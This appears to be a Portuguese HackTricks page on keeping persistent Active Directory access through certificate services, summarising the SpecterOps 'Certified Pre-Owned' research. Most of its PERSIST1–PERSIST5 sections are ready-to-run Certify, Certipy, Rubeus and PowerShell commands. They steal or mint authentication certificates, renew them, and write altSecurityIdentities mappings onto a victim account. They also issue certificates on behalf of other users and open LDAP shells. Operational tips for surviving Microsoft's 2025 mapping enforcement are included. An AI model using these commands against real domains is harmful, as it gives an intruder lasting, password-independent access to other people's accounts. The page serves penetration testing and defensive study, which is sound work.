# Persistência de Conta do AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Este é um pequeno resumo dos capítulos sobre persistência de conta da excelente pesquisa disponível em [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**<sup>[[7]](#references)</sup>

## Compreendendo o Roubo de Credenciais de Usuários Ativos com Certificados – PERSIST1

Em um cenário no qual um certificado que permite a autenticação no domínio pode ser solicitado por um usuário, um atacante tem a oportunidade de solicitar e roubar esse certificado para manter a persistência em uma rede. Por padrão, o template `User` no Active Directory permite essas solicitações, embora isso possa estar desabilitado em alguns casos.<sup>[[3]](#references)[[7]](#references)</sup>

Usando [Certify](https://github.com/GhostPack/Certify) ou [Certipy](https://github.com/ly4k/Certipy), você pode pesquisar templates habilitados que permitem a autenticação de cliente e, em seguida, solicitar um:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
O poder de um certificado está na sua capacidade de autenticar como o usuário ao qual pertence, independentemente de alterações de senha, desde que o certificado permaneça válido.

Você pode converter PEM para PFX e usá-lo para obter um TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Nota: Combinada com outras técnicas (consulte as seções THEFT), a autenticação baseada em certificados permite acesso persistente sem tocar no LSASS e até mesmo a partir de contextos sem privilégios elevados.

## Obtendo Persistência na Máquina com Certificados - PERSIST2

Se um invasor tiver privilégios elevados em um host, poderá inscrever a conta de máquina do sistema comprometido para obter um certificado usando o template padrão `Machine`. Autenticar-se como a máquina habilita o S4U2Self para serviços locais e pode proporcionar persistência duradoura no host:<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Estendendo a Persistência por Meio da Renovação de Certificados - PERSIST3

Abusar dos períodos de validade e renovação dos modelos de certificado permite que um invasor mantenha acesso de longo prazo. Se você possuir um certificado emitido anteriormente e sua chave privada, poderá renová-lo antes da expiração para obter uma credencial nova e de longa duração, sem deixar artefatos de solicitação adicionais vinculados ao principal original.<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Dica operacional: Monitore os tempos de vida dos arquivos PFX mantidos pelo atacante e renove-os antecipadamente. A renovação também pode fazer com que os certificados atualizados incluam a extensão moderna de mapeamento de SID, mantendo-os utilizáveis sob regras mais rigorosas de mapeamento do DC (consulte a próxima seção).

## Implantando Mapeamentos Explícitos de Certificados (altSecurityIdentities) – PERSIST4

Se você puder escrever no atributo `altSecurityIdentities` de uma conta-alvo, poderá mapear explicitamente um certificado controlado pelo atacante para essa conta. Isso persiste após alterações de senha e, ao usar formatos de mapeamento forte, continua funcional sob a aplicação moderna de regras do DC.<sup>[[2]](#references)</sup>

Fluxo de alto nível:

1. Obtenha ou emita um certificado de autenticação de cliente que você controle (por exemplo, faça `enroll` no template `User` como você mesmo).
2. Extraia um identificador forte do certificado (Issuer+Serial, SKI ou SHA1-PublicKey).
3. Adicione um mapeamento explícito ao `altSecurityIdentities` do principal vítima usando esse identificador.
4. Autentique-se com seu certificado; o DC fará o mapeamento para a vítima por meio do mapeamento explícito.

Exemplo (PowerShell) usando um mapeamento forte de Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Em seguida, autentique-se com seu PFX. O Certipy obterá um TGT diretamente:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Criando Mapeamentos `altSecurityIdentities` Fortes

Na prática, os mapeamentos **Issuer+Serial** e **SKI** são os formatos fortes mais fáceis de criar a partir de um certificado sob controle do atacante. Isso é importante após **11 de fevereiro de 2025**, quando os DCs passam a usar **Full Enforcement** por padrão e os mapeamentos fracos deixam de ser confiáveis.<sup>[[1]](#references)</sup>
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notas
- Use apenas tipos de mapeamento fortes: `X509IssuerSerialNumber`, `X509SKI` ou `X509SHA1PublicKey`. Formatos fracos (Subject/Issuer, apenas Subject, e-mail RFC822) estão obsoletos e podem ser bloqueados pela política do DC.
- O mapeamento funciona tanto em objetos **user** quanto **computer**, portanto, o acesso de escrita ao `altSecurityIdentities` de uma conta de computador é suficiente para persistir como essa máquina.
- A cadeia do certificado deve terminar em uma raiz confiável pelo DC. Enterprise CAs no NTAuth geralmente são confiáveis; alguns ambientes também confiam em CAs públicas.
- A autenticação Schannel continua sendo útil para persistência mesmo quando o PKINIT falha porque o DC não possui o Smart Card Logon EKU ou retorna `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### Mapeamentos explícitos `Issuer/SID` de 2025+

Em controladores de domínio **Windows Server 2022+** com a atualização de segurança de **9 de setembro de 2025** instalada, a Microsoft adicionou outro formato de mapeamento explícito forte, atraente para persistência porque sobrevive à reemissão de certificados pela mesma CA:<sup>[[6]](#references)</sup>
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operacionalmente, isso difere dos formatos strong mais antigos:
- `Issuer+Serial` fixa **um certificado exato**.
- `SKI` / `SHA1-PUKEY` fixa **um keypair**.
- `Issuer/SID` fixa a **CA emissora + o SID alvo**, portanto, certificados renovados ou reemitidos pela mesma CA continuam funcionando sem reescrever `altSecurityIdentities`.

Requisitos e ressalvas
- O certificado apresentado para logon deve realmente conter o SID da conta alvo na extensão de segurança SID.
- Esse formato não é útil para certificados no estilo `ESC9` / `ESC16` que omitem a extensão SID; nesses casos, use `Issuer+Serial`, `SKI` ou `SHA1-PUKEY`.

Para mais informações sobre mapeamentos explícitos fracos e caminhos de ataque, consulte:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent como Persistence – PERSIST5

Se você obtiver um certificado válido de Certificate Request Agent/Enrollment Agent, poderá emitir novos certificados com capacidade de logon em nome dos usuários quando quiser e manter o PFX do agent offline como um token de persistence. Fluxo de abuso:<sup>[[7]](#references)</sup>
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
A revogação do certificado do agente ou das permissões do template é necessária para remover essa persistência.

Notas operacionais
- As versões modernas do `Certipy` oferecem suporte a `-on-behalf-of` e `-renew`, permitindo que um invasor que possua um PFX de Enrollment Agent emita e posteriormente renove certificados leaf sem precisar interagir novamente com a conta-alvo original.<sup>[[4]](#references)</sup>
- Se a obtenção de TGT baseada em PKINIT não for possível, o certificado on-behalf-of resultante ainda poderá ser usado para autenticação Schannel com `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.<sup>[[5]](#references)</sup>

## Usando Certificados Persistidos Quando o PKINIT Falha

Se o DC não tiver um certificado compatível com Smart Card Logon, o logon por certificado via PKINIT poderá falhar com `KDC_ERR_PADATA_TYPE_NOSUPP`. Isso **não** elimina o mecanismo de persistência: o mesmo PFX ainda poderá ser usado para acessar o LDAP autenticado via Schannel.<sup>[[5]](#references)</sup>
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Isso é especialmente útil após PERSIST4/PERSIST5, pois você pode continuar operando a partir do Linux/macOS e encadear outras ações de persistência no diretório, como inserir [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) ou editar atributos de delegação graváveis.

## Strong Certificate Mapping Enforcement de 2025: impacto na persistência

A Microsoft KB5014754 introduziu o Strong Certificate Mapping Enforcement nos controladores de domínio. Desde **11 de fevereiro de 2025**, os DCs usam **Full Enforcement** por padrão para mapeamentos fracos/ambíguos e, a partir da atualização de segurança de **9 de setembro de 2025**, os DCs corrigidos não oferecem mais suporte ao fallback antigo do modo de compatibilidade.<sup>[[1]](#references)</sup> Implicações práticas:

- Certificados anteriores a 2022 que não possuem a extensão de mapeamento SID podem falhar no mapeamento implícito quando os DCs estão em Full Enforcement. Os atacantes podem manter o acesso renovando os certificados por meio do AD CS (para obter a extensão SID) ou inserindo um mapeamento explícito forte em `altSecurityIdentities` (PERSIST4).
- Mapeamentos explícitos que usam formatos fortes (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` e, em DCs modernos, `Issuer/SID`) continuam funcionando. Formatos fracos (Issuer/Subject, Subject-only, RFC822) podem ser bloqueados e devem ser evitados para persistência.
- Se os mapeamentos fracos ainda parecerem funcionar, presuma que você encontrou um DC sem as correções ou configurado de forma diferente, e não um caminho confiável de persistência de longo prazo.
- Caminhos de emissão no estilo `ESC9` / `ESC16` que suprimem a extensão SID tornam `Issuer/SID` inutilizável; portanto, mapeamentos fortes alternativos ou a renovação por meio de um template normal tornam-se a opção prática de persistência.

Os administradores devem monitorar e gerar alertas para:
- Alterações em `altSecurityIdentities` e emissões/renovações de certificados de Enrollment Agent e User.
- Logs de emissão da CA referentes a solicitações on-behalf-of e padrões incomuns de renovação.

## Referências

- [1] [Microsoft Support – KB5014754: Alterações na autenticação baseada em certificados nos controladores de domínio do Windows](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – Técnica de abuso ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – Técnicas de persistência de contas](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – Referência de comandos](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – Autenticação com certificados quando o PKINIT não é compatível](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – Apresentando um novo Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: Abusando do Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
